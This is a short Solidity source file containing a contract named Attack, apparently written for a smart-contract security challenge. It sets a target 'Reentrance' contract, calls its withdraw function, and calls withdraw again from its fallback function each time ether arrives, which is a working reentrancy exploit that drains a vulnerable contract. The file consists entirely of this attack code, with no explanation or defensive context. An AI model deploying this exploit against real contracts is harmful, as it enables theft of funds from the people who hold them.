// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {
    function withdraw(uint _amount) external;

} 

contract Attack {
address payable public reentrancyAddress;
Reentrance public ab;

function setAddress (address payable _addr) public {
    reentrancyAddress = _addr;
    ab = Reentrance(reentrancyAddress);
}

function attack() public payable {
    ab.withdraw(1);
}

fallback() external payable {
  ab.withdraw(1);
}
 
}